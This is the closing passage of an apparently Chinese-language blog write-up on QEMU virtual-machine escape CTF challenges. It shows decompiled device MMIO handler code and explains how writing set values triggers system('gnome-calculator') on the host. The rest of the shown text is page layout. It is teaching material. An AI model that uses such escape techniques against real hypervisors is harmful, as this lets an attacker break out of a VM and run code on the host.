addr, __int64 value, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> n[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg11; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  arg11 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">4</span>] = value;</span><br><span class="line">  v11 = a1;</span><br><span class="line">  v8 = (addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  idx = (addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = (_BYTE *)((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> __int64)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'w'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'s'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'a'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'d'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'A'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'B'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>LL:</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> __int16)arg11;</span><br><span class="line">      result = <span class="built_in">memcpy</span>(&amp;command[(<span class="keyword">unsigned</span> __int16)arg11], &amp;n[<span class="number">4</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>综上所述，我们那两轮<code>rfid_mmio_write</code>设置<code>input</code>为<code>wwssadadBABA</code>，设置<code>command</code>为<code>gnome-calculator</code>，最后调用<code>rfid_mmio_read</code>触发<code>system(&quot;gnome-calculator&quot;)</code>，弹出计算器</p>
+<p><img src="/2020/01/03/strng/6.png" alt="res"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这三道题应该是逃逸类题目里最简单的类型，像是glibc pwn的数组越界，只要理解利用的原理就不难做，希望新的一年自己能学更多东西，努力追赶少年时的梦想。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/02/heap_master/" rel="next" title="Star CTF heap_master">
+                <i class="fa fa-chevron-left"></i> Star CTF heap_master
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">60</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/helica" title="Helica" target="_blank">Helica</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ble55ing.github.io/" title="blessing" target="_blank">blessing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#qemu逃逸初探"><span class="nav-number">1.</span> <span class="nav-text">qemu逃逸初探</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#地址转换"><span class="nav-number">1.2.1.</span> <span class="nav-text">地址转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pci设备空间"><span class="nav-number">1.2.2.</span> <span class="nav-text">pci设备空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看pci设备"><span class="nav-number">1.2.3.</span> <span class="nav-text">查看pci设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu访问I-O空间"><span class="nav-number">1.2.4.</span> <span class="nav-text">qemu访问I/O空间</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#访问mmio"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">访问mmio</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#访问pmio"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">访问pmio</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QOM编程模型"><span class="nav-number">1.2.5.</span> <span class="nav-text">QOM编程模型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blizzard-CTF-2017-Strng"><span class="nav-number">1.3.</span> <span class="nav-text">Blizzard CTF 2017 Strng</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析"><span class="nav-number">1.3.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">1.3.3.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-c"><span class="nav-number">1.3.4.</span> <span class="nav-text">exp.c</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#湖湘杯2019-pwn2"><span class="nav-number">1.4.</span> <span class="nav-text">湖湘杯2019 pwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">1.4.2.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-c-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">exp.c</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数字经济线下RealWorld-Qemu-Escape"><span class="nav-number">1.5.</span> <span class="nav-text">数字经济线下RealWorld-Qemu-Escape</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析-1"><span class="nav-number">1.5.2.</span> <span class="nav-text">程序分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">1.6.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2020/01/03/strng/';
+        this.page.identifier = '2020/01/03/strng/';
+        this.page.title = 'qemu逃逸初探';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: '',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
